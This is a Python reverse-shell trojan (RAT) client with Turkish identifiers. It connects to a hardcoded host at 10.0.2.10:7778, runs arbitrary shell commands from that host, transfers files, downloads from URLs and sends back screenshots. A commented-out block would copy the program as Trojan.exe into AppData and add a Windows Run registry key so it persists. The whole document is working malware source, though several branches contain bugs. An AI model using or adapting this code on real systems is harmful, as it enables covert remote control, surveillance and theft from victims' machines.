#!/usr/bin/env python
#!-*-coding:UTF-8-*-

import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64
import requests
import ctypes
from mss import mss

def baglanti_dene():
	while True:	
		time.sleep(10)
		try:
			soket.connect(("10.0.2.10",7778))
			kabuk()
		except:
			baglanti_dene()

def verigonder(data):
	j_data=json.dumps(data)
	soket.send(j_data)

def verial():
	j_data = " "
	while True:
		try:
			j_data=j_data+soket.recv(1024)
			return json.loads(j_data)
		except ValueError:
			continue
def ekranresmi():
	with mss() as ekranresmi:
		ekranresmi.shot()
def webindir():
	url_dosya=requests.get(url, allow_redirects=True)
	dosyaismi=url.split("/")[-1]
	open(dosyaismi, 'wb').write(url_dosya.content)
def ayricalik():
	global yetki
	try:
		temp = os.listdir(os.sep.join([os.environ.get('SystmRoot','C:\\windows'),'temp']))
	except:
		yetki="User(Kullanıcı) Ayrıcalıkları"
	else:
		yetki="Admin(Yönetici) Ayrıcalıkları"
def kabuk():
	while True:
		kod=verial()
		if kod=="0":
			break
		elif kod[:2]=='cd' and len(kod)>1:
			try:
				os.chdir(kod[3:])
			except:
				continue			
		elif kod[:5]=='indir':
			try:
				dosya=open(kod[:6], 'rb')
				verigonder(base64.b64encode(dosya.read()))
			except:
				continue 
		elif kod[:5]=='yükle':
			try: 
				i=0
				with open('yuklenen_dosya','wb') as dosya:
					while True:
						data = soket.recv(1024)
						if not data:
							break
						dosya.write(data)
					dosya.close()
				i=+1
			except:
				continue
		elif kod[:8]=="webyükle":
			try: 
				webindir(kod[9:])
				verigonder("Dosya Başarıyla İndirildi")
			except:
				continue
		elif kod[:5]=="start":
			try:
				subprocess.Popen(kod[6:], shell=True)
				verigonder("Uygulama Açıldı")
			except:
				verigonder("HATA: Uygulama Çalıştırılamadı")
		elif kod[:10]=="ekanresmi":
			try:
				ekranresmi()			
				e_resmi=open("monitor-1.png")
				verigonder(base64.b64encode(e_resmi.read()))
				os.remove("monitor-1.png")
			except:
				verigonder("Hata: Ekran Resmi Alınamadı!")
		elif kod=="kontrol":
			try:
				ayricalik()
				verigonder(admin)
			except:
				verigonder("HATA: Yetki Kontrolü Şu Anda Kullanılamaz!")
		else:
			try:
				komut=subprocess.Popen(kod, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				sonuc=komut.stdout.read() +komut.stderr.read()
				verigonder(sonuc)
			except: 
				verigonder("HATA: Komut : çalıştırılamadı")

"""kopyala=os.environ["appdata"]+"\\Trojan.exe"
if not os.path.exists(kopyala):
	shutil.copyfile(sys.executable, kopyala)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RUN /v Trojan /t REG_SZ /d "'+kopyala+'"', shell=True)
"""
soket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
baglanti_dene()
soket.close()
